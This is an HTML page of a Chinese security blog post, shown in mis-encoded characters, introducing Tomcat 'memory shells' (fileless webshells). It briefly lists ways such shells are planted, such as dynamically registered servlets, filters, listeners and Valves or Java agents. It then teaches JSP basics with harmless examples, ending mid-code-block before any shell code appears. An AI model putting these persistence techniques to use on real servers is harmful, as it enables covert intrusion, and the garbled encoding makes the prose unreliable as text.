<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="æµ…ætomcatæ¶æ„ä»¥åŠtomcatå†…å­˜é©¬">
<title>Tomcatå†…å­˜é©¬</title>

<link rel='canonical' href='https://fupanc-w1n.github.io/p/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/'>

<link rel="stylesheet" href="/scss/style.min.45e3de8c0814070cbaa5e985ce54bc3660dbcbfa7077926b65bdd229ae300803.css"><meta property='og:title' content="Tomcatå†…å­˜é©¬">
<meta property='og:description' content="æµ…ætomcatæ¶æ„ä»¥åŠtomcatå†…å­˜é©¬">
<meta property='og:url' content='https://fupanc-w1n.github.io/p/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/'>
<meta property='og:site_name' content='fupanc'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-09-03T20:23:06&#43;08:00'/><meta property='article:modified_time' content='2024-09-03T20:23:06&#43;08:00'/>
<meta name="twitter:title" content="Tomcatå†…å­˜é©¬">
<meta name="twitter:description" content="æµ…ætomcatæ¶æ„ä»¥åŠtomcatå†…å­˜é©¬">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/123_hu_e29e335f2b79de0d.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ”‹</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">fupanc</a></h1>
            <h2 class="site-description">æˆ‘ä¸æˆ‘å‘¨æ—‹ä¹…ï¼Œå®åšæˆ‘</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/fupanc-w1n'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†</a>
      <ol>
        <li><a href="#jsp">JSP</a>
          <ol>
            <li><a href="#è¯­æ³•">è¯­æ³•</a></li>
            <li><a href="#jspæŒ‡ä»¤">JSPæŒ‡ä»¤</a></li>
            <li><a href="#jspéšå¼å¯¹è±¡">JSPéšå¼å¯¹è±¡</a></li>
          </ol>
        </li>
        <li><a href="#tomcatæ¶æ„å­¦ä¹ ">Tomcatæ¶æ„å­¦ä¹ </a>
          <ol>
            <li><a href="#java-webä¸‰å¤§ä»¶">Java Webä¸‰å¤§ä»¶</a></li>
            <li><a href="#tomcatæ¶æ„">Tomcatæ¶æ„</a></li>
          </ol>
        </li>
        <li><a href="#pipelinevalve">pipeline/valve</a></li>
      </ol>
    </li>
    <li><a href="#å†…å­˜é©¬å­¦ä¹ ">å†…å­˜é©¬å­¦ä¹ </a>
      <ol>
        <li>
          <ol>
            <li><a href="#filter-å‹å†…å­˜é©¬">Filter å‹å†…å­˜é©¬</a></li>
            <li><a href="#listenerå‹å†…å­˜é©¬">Listenerå‹å†…å­˜é©¬</a></li>
            <li><a href="#sevletå‹å†…å­˜é©¬">Sevletå‹å†…å­˜é©¬</a></li>
            <li><a href="#valve-å‹å†…å­˜é©¬">Valve å‹å†…å­˜é©¬</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/java%E5%AE%89%E5%85%A8/" style="background-color: #2a9d8f; color: #fff;">
                Javaå®‰å…¨
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcatå†…å­˜é©¬</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            æµ…ætomcatæ¶æ„ä»¥åŠtomcatå†…å­˜é©¬
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2024-09-03</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 21 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="tomcatå†…å­˜é©¬">Tomcatå†…å­˜é©¬
</h1><p>å†…å­˜é©¬å³ä»…å­˜åœ¨äºå†…å­˜ä¸­çš„æ— æ–‡ä»¶æ¶æ„ä»£ç ã€‚ä¹Ÿå°±æ˜¯<strong>æ— æ–‡ä»¶è½åœ°çš„ webshell æŠ€æœ¯</strong>ã€‚</p>
<p>webshellå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ç§webæœåŠ¡ï¼Œé‚£ä¹ˆä»åˆ›å»ºwebæœåŠ¡çš„è§’åº¦æ¥çœ‹ï¼Œæœ‰ä¸‹é¢å‡ ç§æ‰‹æ®µå’Œæ€è·¯ï¼š</p>
<ul>
<li>åŠ¨æ€æ³¨å†Œ servlet/filter/listenerï¼ˆä½¿ç”¨ servlet-apiçš„å…·ä½“å®ç°ï¼‰</li>
<li>åŠ¨æ€æ³¨å†Œ interceptor/controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring/struts2ï¼‰</li>
<li>åŠ¨æ€æ³¨å†Œä½¿ç”¨èŒè´£é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline &amp; Valveï¼ŒGrizzly çš„ FilterChain &amp; Filterç­‰ç­‰ï¼‰</li>
<li>ä½¿ç”¨ java agent æŠ€æœ¯å†™å…¥å­—èŠ‚ç </li>
</ul>
<p>Tomcatå†…å­˜é©¬ä¹Ÿæ˜¯ç»å¸¸ç”¨çš„ã€‚</p>
<h2 id="åŸºç¡€çŸ¥è¯†">åŸºç¡€çŸ¥è¯†
</h2><h3 id="jsp">JSP
</h3><p><strong>åœ¨å­¦ä¹ å†…å­˜é©¬ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹jspæŠ€æœ¯ã€‚</strong></p>
<p>JSPå…¨åä¸ºJava Server Pagesï¼Œæ˜¯ä¸€ç§åŠ¨æ€ç½‘é¡µå¼€å‘æŠ€æœ¯ï¼Œå…¶æ ¹æœ¬æ˜¯ä¸€ä¸ªç®€åŒ–çš„Serrvletè®¾è®¡ï¼Œå®ƒæ˜¯åœ¨ä¼ ç»Ÿçš„ç½‘é¡µHTMLä¸­æ’å…¥javaç¨‹åºæ®µå’ŒJSPæ ‡è®°ï¼Œä»è€Œè®©å½¢æˆJSPæ–‡ä»¶ï¼ˆ.jspï¼‰ï¼Œåœ¨å¸¸è§æ¡†æ¶ä¸­ï¼Œé€šå¸¸æ˜¯åœ¨tomcatä¸­æœ‰æ‰€ä½¿ç”¨ï¼Œä½†æ€»çš„æ¥è¯´jspç°åœ¨ä¸æ˜¯éå¸¸å¸¸è§äº†ã€‚</p>
<h4 id="è¯­æ³•">è¯­æ³•
</h4><h5 id="è„šæœ¬ç¨‹åº">è„šæœ¬ç¨‹åº
</h5><p>è„šæœ¬ç¨‹åºå¯ä»¥åŒ…å«ä»»æ„é‡çš„Javaè¯­å¥ã€å˜é‡ã€æ–¹æ³•æˆ–è¡¨è¾¾å¼ï¼Œè¯­æ³•æ ¼å¼ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;% ä»£ç ç‰‡æ®µ %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•ç»™ä¸€ä¸ªjspç¤ºä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Title&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">&lt;%
</span></span><span class="line"><span class="cl">    out.println(&#34;æˆåŠŸè°ƒç”¨è„šæœ¬ç¨‹åº&#34;);
</span></span><span class="line"><span class="cl">%&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="jspå£°æ˜">JSPå£°æ˜
</h5><p>ä¸€ä¸ªå£°æ˜è¯­å¥å¯ä»¥å£°æ˜ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ã€æ–¹æ³•ï¼Œä¾›åé¢çš„Javaä»£ç ä½¿ç”¨ã€‚åœ¨JSPæ–‡ä»¶ä¸­ï¼Œéœ€è¦å…ˆå£°æ˜è¿™äº›å˜é‡å’Œæ–¹æ³•æ‰èƒ½ä½¿ç”¨å®ƒä»¬ã€‚</p>
<p>JSPå£°æ˜çš„è¯­æ³•æ ¼å¼ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%! declared; %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç­‰ä»·äºä¸‹é¢çš„XMLè¯­å¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;jsp:declaration&gt;   
</span></span><span class="line"><span class="cl">ä»£ç ç‰‡æ®µ
</span></span><span class="line"><span class="cl">&lt;/jsp:declaration&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¯”å¦‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%! int i = 0; %&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="jspè¡¨è¾¾å¼">JSPè¡¨è¾¾å¼
</h5><p>ä¸€ä¸ªJSPè¡¨è¾¾å¼ä¸­åŒ…å«çš„è„šæœ¬è¯­è¨€è¡¨è¾¾å¼ï¼Œå…ˆè¢«è½¬åŒ–æˆStringï¼Œç„¶åæ’å…¥åˆ°è¡¨è¾¾å¼å‡ºç°çš„åœ°æ–¹ã€‚</p>
<p>ç”±äºè¡¨è¾¾å¼çš„å€¼ä¼šè¢«è½¬åŒ–æˆStringï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸€ä¸ªæ–‡æœ¬è¡Œä¸­ä½¿ç”¨è¡¨è¾¾å¼è€Œä¸ç”¨ç®¡å®ƒæ˜¯å¦æ˜¯HTMLæ ‡ç­¾ã€‚</p>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯</strong>ï¼šè¡¨è¾¾å¼å…ƒç´ ä¸­å¯ä»¥åŒ…å«ä»»ä½•Javaè¯­è¨€ï¼Œä½†æ˜¯ä¸èƒ½ç”¨åˆ†å·æ¥ç»“æŸè¡¨è¾¾å¼ã€‚</p>
<p>è¯­æ³•æ ¼å¼ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%= è¡¨è¾¾å¼ %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç­‰ä»·äºä¸‹é¢çš„XMLè¡¨è¾¾å¼ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;jsp:expression&gt;   è¡¨è¾¾å¼&lt;/jsp:expression&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¤ºä¾‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Title&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">&lt;p&gt;
</span></span><span class="line"><span class="cl">    ä»Šå¤©çš„æ—¥æœŸæ˜¯: &lt;%= (new java.util.Date()).toLocaleString()%&gt;
</span></span><span class="line"><span class="cl">&lt;/p&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¡µé¢ä¸ºï¼š
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055883.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240830141645804"
	
	
></p>
<p>æ‰€ä»¥æƒ³è¦åœ¨é¡µé¢ä¸Šæœ‰å›æ˜¾å¯ä»¥ä½¿ç”¨è„šæœ¬ç¨‹åºæˆ–è€…è¡¨è¾¾å¼ã€‚</p>
<h5 id="jspæ³¨é‡Š">JSPæ³¨é‡Š
</h5><p>JSPæ³¨é‡Šä¸»è¦æœ‰ä¸¤ä¸ªä½œç”¨ï¼šä¸ºä»£ç ä½œæ³¨é‡Šä»¥åŠå°†æŸæ®µä»£ç æ³¨é‡Šæ‰ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%--æ³¨é‡Š--%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·æ³¨é‡Šå†…å®¹å°±ä¸ä¼šè¢«å‘é€è‡³æµè§ˆå™¨å¹¶ä¸”ä¸ä¼šè¢«ç¼–è¯‘ã€‚</p>
<h4 id="jspæŒ‡ä»¤">JSPæŒ‡ä»¤
</h4><p>JSPæŒ‡ä»¤ç”¨æ¥è®¾ç½®æ•´ä¸ªJSPé¡µé¢ç›¸å…³çš„å±æ€§ï¼Œå¦‚ç½‘é¡µç¼–ç æ–¹å¼å’Œè„šæœ¬è¯­è¨€ã€‚</p>
<p>è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ directive attribute=&#34;value&#34; %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŒ‡ä»¤å¯ä»¥æœ‰å¾ˆå¤šæ ¼å±æ€§ï¼Œå®ƒä»¬ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜åœ¨ï¼Œå¹¶ç”¨é€—å·éš”å¼€ã€‚</p>
<p>JSPä¸­çš„ä¸‰ç§æŒ‡ä»¤æ ‡ç­¾ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>æŒ‡ä»¤</th>
          <th>æè¿°</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>&lt;%@ page .. %&gt;</td>
          <td>å®šä¹‰ç½‘é¡µä¾èµ–å±æ€§ï¼Œæ¯”å¦‚è„šæœ¬è¯­è¨€ã€erroré¡µé¢ã€ç¼“å­˜éœ€æ±‚ç­‰ç­‰</td>
      </tr>
      <tr>
          <td>&lt;%@ include &mdash; %&gt;</td>
          <td>åŒ…å«å…¶ä»–æ–‡ä»¶</td>
      </tr>
      <tr>
          <td>&lt;%@ taglib &hellip; %&gt;</td>
          <td>å¼•å…¥æ ‡ç­¾åº“çš„å®šä¹‰</td>
      </tr>
  </tbody>
</table></div>
<p><strong>ç®€å•è¯´è¯´includeæŒ‡ä»¤</strong>ï¼ŒJSPå¯ä»¥é€šè¿‡includeæŒ‡ä»¤æ¥åŒ…å«å…¶ä»–æ–‡ä»¶ã€‚è¢«åŒ…å«çš„æ–‡ä»¶å¯ä»¥æ˜¯JSPæ–‡ä»¶ã€HTMLæ–‡ä»¶æˆ–æ–‡æœ¬æ–‡ä»¶ã€‚åŒ…å«çš„æ–‡ä»¶å°±å¥½åƒæ˜¯è¯¥JSPæ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œä¼šè¢«åŒæ—¶ç¼–è¯‘æ‰§è¡Œã€‚</p>
<p>includeæŒ‡ä»¤çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ include file=&#34;æ–‡ä»¶ç›¸å¯¹ url åœ°å€&#34; %&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç­‰ä»·çš„XMLè¯­æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;jsp:directive.include file=&#34;æ–‡ä»¶ç›¸å¯¹ url åœ°å€&#34; /&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç­‰å¯å‚è€ƒï¼š<code>https://www.runoob.com/jsp/jsp-directives.html</code>ï¼Œè¿˜æ˜¯å¾ˆæœ‰æƒ³æ³•çš„ã€‚</p>
<h4 id="jspéšå¼å¯¹è±¡">JSPéšå¼å¯¹è±¡
</h4><p>JSPéšå¼å¯¹è±¡æ—¶JSPå®¹å™¨ä¸ºæ¯ä¸ªé¡µé¢æä¾›çš„Javaå¯¹è±¡ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒä»¬è€Œä¸ç”¨æ˜¾ç¤ºå£°æ˜ã€‚JSPéšå¼å¯¹è±¡ä¹Ÿè¢«ç§°ä¸ºé¢„å®šä¹‰å˜é‡ï¼ŒJSPæ‰€æ”¯æŒçš„ä¹å¤§éšå¼å¯¹è±¡ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">requestï¼šHttpServletRequestæ¥å£çš„å®ä¾‹
</span></span><span class="line"><span class="cl">responseï¼šHttpServletResponse æ¥å£çš„å®ä¾‹
</span></span><span class="line"><span class="cl">outï¼šJspWriteç±»çš„å®ä¾‹ï¼Œç”¨äºæŠŠç»“æœè¾“å‡ºè‡³ç½‘é¡µä¸Š
</span></span><span class="line"><span class="cl">sessionï¼šHttpSessionç±»çš„å®ä¾‹
</span></span><span class="line"><span class="cl">applicationï¼šServletContextç±»çš„å®ä¾‹
</span></span><span class="line"><span class="cl">configï¼šServletConfigç±»çš„å®ä¾‹
</span></span><span class="line"><span class="cl">pageContextï¼šPageContextç±»çš„å®ä¾‹ï¼Œæä¾›å¯¹JSPé¡µé¢æ‰€æœ‰å¯¹è±¡ä»¥åŠå‘½ä»¤ç©ºé—´çš„è®¿é—®
</span></span><span class="line"><span class="cl">pageï¼šç±»ä¼¼ä¸javaä¸­çš„thiså…³é”®å­—
</span></span><span class="line"><span class="cl">Exceptionï¼šExceptionç±»çš„å¯¹è±¡ï¼Œä»£è¡¨å‘ç”Ÿé”™è¯¯çš„JSPé¡µé¢ä¸­å¯¹åº”çš„å¼‚å¸¸å¯¹è±¡
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¯¦ç»†è¯´æ˜ï¼Œæ¯”å¦‚</p>
<ul>
<li><strong>requestå¯¹è±¡</strong>æä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•æ¥è·å–HTTPå¤´ä¿¡æ¯ï¼Œcookiesï¼ŒHTTPæ–¹æ³•ç­‰ï¼ŒæœåŠ¡ç«¯éœ€è¦é€šè¿‡requestå¯¹è±¡æ‹¿åˆ°éœ€è¦çš„æ•°æ®ï¼Œç„¶ååšå‡ºå“åº”ã€‚</li>
</ul>
<p>å¸¸ç”¨æ–¹æ³•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
